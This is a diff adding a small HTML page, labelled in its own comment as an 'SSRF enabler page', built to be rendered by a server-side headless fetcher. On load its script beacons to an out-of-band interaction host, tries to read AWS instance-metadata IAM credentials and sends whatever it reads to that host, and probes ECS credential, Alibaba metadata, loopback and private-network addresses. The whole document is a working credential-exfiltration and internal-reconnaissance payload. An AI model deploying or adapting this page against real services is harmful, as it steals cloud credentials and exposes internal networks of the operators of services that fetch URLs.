@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head><title>ok</title></head>
+<body>
+<!-- SSRF enabler page: probes internal reachability + attempts metadata exfil, reports to OOB -->
+<pre id="log"></pre>
+<script>
+var OOB = "https://d9pu36n1v5mgi5lnn0p0bnutgc4ajp46i.oast.fun";
+function ping(tag) {
+  try { (new Image()).src = OOB + "/ev/" + tag; } catch(e) {}
+}
+function encodeTXT(d) { return encodeURIComponent((d||"").slice(0, 4000)); }
+function post(tag, data) {
+  try {
+    // GET exfil via img (works even for large-ish data if URL-encoded)
+    (new Image()).src = OOB + "/d/" + tag + "?q=" + encodeTXT(data);
+  } catch(e) { ping("postfail/" + tag); }
+}
+// 1) Page loaded signal (proves the headless fetcher rendered my page)
+ping("page-loaded-1");
+setTimeout(function(){ ping("page-loaded-2"); }, 500);
+
+// 2) CORS read attempt of metadata (works if fetcher is --disable-web-security)
+function tryReadCors() {
+  fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/", {cache:"no-store"})
+    .then(function(r){ return r.text(); })
+    .then(function(t){ post("iam-read", t); ping("iam-read-ok"); })
+    .catch(function(e){ ping("iam-read-cors-blocked"); });
+  fetch("http://169.254.169.254/latest/meta-data/", {cache:"no-store"})
+    .then(function(r){ return r.text(); })
+    .then(function(t){ post("meta-read", t); ping("meta-read-ok"); })
+    .catch(function(){ ping("meta-read-cors-blocked"); });
+}
+
+// 3) In-browser reachability oracle (no-cors fetch: ok = TCP+HTTP success, err = unreachable)
+function probe(u, tag) {
+  fetch(u, {mode:"no-cors", cache:"no-store", signal: setTimeout ? AbortSignal.timeout(6000) : undefined})
+    .then(function(){ ping("probe/" + tag + "/ok"); })
+    .catch(function(){ ping("probe/" + tag + "/err"); });
+}
+setTimeout(function(){
+  probe("http://169.254.169.254/latest/meta-data/", "meta");
+  probe("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "iam");
+  probe("http://169.254.170.2/v2/credentials/", "ecscreds");
+  probe("http://100.100.100.200/latest/meta-data/", "aliyunctl");
+  probe("http://10.255.255.1/", "blackholectl");
+  probe("http://127.0.0.1:80/", "loop80");
+  probe("http://127.0.0.1:1/", "loop1ctl");
+  probe("http://192.168.1.1/", "rfc1918ctl");
+}, 800);
+
+tryReadCors();
+</script>
+</body>
+</html>
